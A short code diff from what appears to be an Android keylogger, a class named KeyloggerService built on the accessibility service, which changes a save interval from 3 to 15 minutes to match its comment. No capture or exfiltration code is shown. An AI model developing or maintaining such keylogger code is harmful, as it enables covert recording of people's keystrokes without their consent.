@@ -16,7 +16,7 @@ public class KeyloggerService extends AccessibilityService {
 
     private Handler handler = new Handler();
     private long sessionStart;
-    private final long INTERVAL = 3 * 60 * 1000; // 15 minutes in milliseconds
+    private final long INTERVAL = 15 * 60 * 1000; // 15 minutes in milliseconds
 
     private final Runnable saveRunnable = new Runnable() {
         @Override
